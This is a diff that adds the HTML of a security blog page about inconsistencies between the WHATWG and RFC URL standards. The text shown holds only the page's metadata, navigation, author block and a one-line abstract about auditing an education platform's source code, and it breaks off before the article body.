@@ -1,0 +1,1685 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="light"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>A Research Of The Inconsistency Between WHATWG URL standard And RFC URL standard &middot; 1337妙妙屋</title>
+  <meta name="title" content="A Research Of The Inconsistency Between WHATWG URL standard And RFC URL standard &middot; 1337妙妙屋" />
+  
+  
+  
+  
+  
+  <link rel="canonical" href="https://shangrui-hash.github.io/en/posts/a_research_of_inconsistencies_in_front_and_backend_url_parsers/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.1c9cd0d1ebaf117272b5c4f6bd49878475cb210d5e0da4f061632d779f5bb46851881c187e6e634dba5071c4e3d80e7d5cec1dd80443b2fa68acd358f9eda881.css"
+    integrity="sha512-HJzQ0euvEXJytcT2vUmHhHXLIQ1eDaTwYWMtd59btGhRiBwYfm5jTbpQccTj2A59XOwd2ARDsvporNNY&#43;e2ogQ==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.f7f2ca6be7475eb54e22282d15a66c0b5afba16e517e3c40e52197911d057d5c8c3cb71c86e5664e88a2a27dc627f321d2a77cc2ab72adafd83fdd83a40ec304.js"
+    integrity="sha512-9/LKa&#43;dHXrVOIigtFaZsC1r7oW5RfjxA5SGXkR0FfVyMPLcchuVmToiion3GJ/Mh0qd8wqtyra/YP92DpA7DBA==" data-copy="" data-copied=""></script>
+  
+  
+  
+  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="A Research Of The Inconsistency Between WHATWG URL standard And RFC URL standard" />
+<meta property="og:description" content="In August 2022, when digging the SRC of Tianrongxin, I found that redacted teaching and training system was used in a site of Tianrongxin Education, so I downloaded the source code of redacted on github and audited it." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://shangrui-hash.github.io/en/posts/a_research_of_inconsistencies_in_front_and_backend_url_parsers/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-03-17T16:40:17+08:00" />
+<meta property="article:modified_time" content="2023-03-17T16:40:17+08:00" />
+
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="A Research Of The Inconsistency Between WHATWG URL standard And RFC URL standard"/>
+<meta name="twitter:description" content="In August 2022, when digging the SRC of Tianrongxin, I found that redacted teaching and training system was used in a site of Tianrongxin Education, so I downloaded the source code of redacted on github and audited it."/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "A Research Of The Inconsistency Between WHATWG URL standard And RFC URL standard",
+    "headline": "A Research Of The Inconsistency Between WHATWG URL standard And RFC URL standard",
+    
+    "abstract": "In August 2022, when digging the SRC of Tianrongxin, I found that redacted teaching and training system was used in a site of Tianrongxin Education, so I downloaded the source code of redacted on github and audited it.",
+    "inLanguage": "en",
+    "url" : "https:\/\/shangrui-hash.github.io\/en\/posts\/a_research_of_inconsistencies_in_front_and_backend_url_parsers\/",
+    "author" : {
+      "@type": "Person",
+      "name": "无在无不在"
+    },
+    "copyrightYear": "2023",
+    "dateCreated": "2023-03-17T16:40:17\u002b08:00",
+    "datePublished": "2023-03-17T16:40:17\u002b08:00",
+    
+    "dateModified": "2023-03-17T16:40:17\u002b08:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2738"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="无在无不在" />
+  
+  
+  
+  <link href="https://x.com/RuiShang9" rel="me" />
+  
+  
+  <link href="https://github.com/ShangRui-hash" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-106B2GZYFQ"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-106B2GZYFQ');
+</script>
+
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/en/" class="text-base font-medium text-gray-500 hover:text-gray-900">1337妙妙屋</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Blog
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="https://github.com/ShangRui-hash"  target="_blank"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <span >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+    </span>
+    
+    <p class="text-base font-medium" title="">
+        
+    </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class=" flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 md:hidden">
+
+        <label id="menu-button" class="block">
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li id="menu-close-button">
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Blog
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="https://github.com/ShangRui-hash"  target="_blank"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <div >
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+        </div>
+        
+        <p class="text-bg font-bg" title="">
+            
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      A Research Of The Inconsistency Between WHATWG URL standard And RFC URL standard
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2023-03-17T16:40:17&#43;08:00">17 March 2023</time><span class="px-2 text-primary-500">&middot;</span><span>2738 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">13 mins</span><span class="px-2 text-primary-500">&middot;</span>
+
+
+<script type="text/javascript" src="/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>
+
+<span class="mb-[2px]">
+    <span id="zen-mode-button"
+          class="text-lg hover:text-primary-500"
+          title="Enable zen mode"
+          data-title-i18n-disable="Enable zen mode"
+          data-title-i18n-enable="Disable zen mode">
+        <span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
+    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
+</svg>
+  </span>
+
+</span>
+    </span>
+</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="无在无不在" src="/ava_huc82d7b839fc53b7a5c86bd3cdfedcac6_357652_192x192_fill_q75_box_center.jpg" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      Author
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      无在无不在
+    </div>
+    
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://x.com/RuiShang9"
+          target="_blank"
+          aria-label="Twitter"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/ShangRui-hash"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+      
+
+      
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">
+
+         <details open id="TOCView"
+  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
